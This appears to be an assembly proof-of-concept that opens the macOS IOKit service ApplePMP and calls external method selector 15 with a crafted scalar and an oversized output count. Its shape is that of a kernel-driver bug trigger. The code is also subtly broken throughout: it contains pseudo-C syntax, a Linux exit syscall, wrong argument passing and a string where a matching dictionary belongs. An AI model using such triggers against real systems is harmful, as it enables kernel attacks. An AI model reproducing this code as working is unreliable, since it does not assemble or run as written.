section .data
    service db "ApplePMP", 0
    failServiceMsg db "[-] failed to find service", 10, 0
    failOpenMsg db "[-] failed to open service: %x", 10, 0
    openServiceMsg db "[+] opened service=0x%x", 10, 0
    krStatusMsg db "[*] kr 0x%x", 10, 0
    inputScalar dq 0x17BAA35D8C17BAA
    inputStruct times 4096 db 0
    outputScalar times 16 dq 0
    outputStruct times 4096 db 0
    selector dd 15
    inputScalarCnt dd 1
    outputScalarCnt dd 0
    inputStructCnt dq 0
    outputStructCnt dq 0xA

section .bss
    conn resb 8
    kr resb 4
    thread resb 8

section .text
    global _start

_start:
    ; Set stdout buffer to NULL
    mov edi, 0 ; file descriptor 1 for stdout
    mov rsi, 0 ; NULL pointer for buffer
    call setbuf

    ; Get service
    mov rdi, service ; Service name
    call IOServiceGetMatchingService
    test rax, rax
    jz fail_find_service

    mov [conn], rax

    ; Open service
    mov rdi, [conn]
    mov rsi, mach_task_self()
    xor edx, edx ; type = 0
    lea rcx, [conn]
    call IOServiceOpen
    mov [kr], eax
    test eax, eax
    jnz fail_open_service

    ; Prepare for IOConnectCallMethod
    lea rdi, [conn] ; Connection
    mov esi, [selector] ; Selector
    lea rdx, [inputScalar] ; Input scalar
    mov rcx, [inputScalarCnt] ; Input scalar count
    lea r8, [inputStruct] ; Input structure
    mov r9, [inputStructCnt] ; Input structure count
    lea rax, [outputScalar] ; Output scalar
    push rax
    lea rax, [outputScalarCnt] ; Output scalar count
    push rax
    lea rax, [outputStruct] ; Output structure
    push rax
    lea rax, [outputStructCnt] ; Output structure count
    push rax
    call IOConnectCallMethod
    mov [kr], eax

    ; Print kr status
    mov rdi, krStatusMsg
    mov rsi, [kr]
    call printf
    jmp end

fail_find_service:
    mov rdi, failServiceMsg
    call printf
    jmp end

fail_open_service:
    mov rdi, failOpenMsg
    mov rsi, [kr]
    call printf
    jmp end

end:
    mov eax, 60 ; syscall number for exit
    xor edi, edi ; status 0
    syscall


